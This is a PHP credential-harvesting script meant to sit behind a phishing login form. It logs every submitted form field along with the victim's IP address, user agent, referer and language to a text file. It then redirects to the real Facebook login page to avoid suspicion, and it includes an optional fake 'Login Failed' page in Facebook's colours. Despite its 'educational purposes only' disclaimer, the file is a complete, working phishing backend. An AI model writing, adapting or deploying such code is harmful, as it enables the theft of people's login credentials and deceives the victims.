<?php
/**
 * Credential Harvesting Script
 * This script captures credentials from phishing forms and logs them.
 * WARNING: This is for educational purposes only. Unauthorized use is illegal.
 */

// Configuration
$LOG_FILE = 'credentials.txt';
$REDIRECT_URL = 'https://www.facebook.com'; // Change to target platform's login page
$LOG_IP = true;
$LOG_USER_AGENT = true;

// Function to log credentials
function log_credentials($data) {
    global $LOG_FILE, $LOG_IP, $LOG_USER_AGENT;
    
    $log_entry = "[" . date('Y-m-d H:i:s') . "]\n";
    
    if ($LOG_IP && isset($_SERVER['REMOTE_ADDR'])) {
        $log_entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    }
    
    if ($LOG_USER_AGENT && isset($_SERVER['HTTP_USER_AGENT'])) {
        $log_entry .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    }
    
    $log_entry .= "Credentials:\n";
    
    foreach ($data as $key => $value) {
        $log_entry .= "  " . htmlspecialchars($key) . ": " . htmlspecialchars($value) . "\n";
    }
    
    $log_entry .= str_repeat("-", 80) . "\n\n";
    
    file_put_contents($LOG_FILE, $log_entry, FILE_APPEND);
}

// Function to sanitize input
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Main processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture all form data
    $credentials = array();
    
    foreach ($_POST as $key => $value) {
        $credentials[$key] = sanitize_input($value);
    }
    
    // Log the credentials
    log_credentials($credentials);
    
    // Capture additional information
    $additional_info = array(
        'Referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Unknown',
        'Accept-Language' => isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Unknown',
        'Request-URI' => $_SERVER['REQUEST_URI']
    );
    
    // Log additional info
    log_credentials($additional_info);
}

// Redirect to real login page to avoid suspicion
header('Location: ' . $REDIRECT_URL);
exit;

// Alternative: Display error message
/*
echo '<!DOCTYPE html>';
echo '<html lang="en">';
echo '<head>';
echo '<meta charset="UTF-8">';
echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
echo '<title>Login Error</title>';
echo '<style>';
echo 'body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; text-align: center;}';
echo '.error { color: red; font-size: 24px; margin-bottom: 20px;}';
echo '.button { background-color: #1877f2; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 10px;}';
echo '</style>';
echo '</head>';
echo '<body>';
echo '<div class="error">Login Failed</div>';
echo '<p>Invalid username or password. Please try again.</p>';
echo '<a href="' . $REDIRECT_URL . '" class="button">Go to Login Page</a>';
echo '</body>';
echo '</html>';
*/
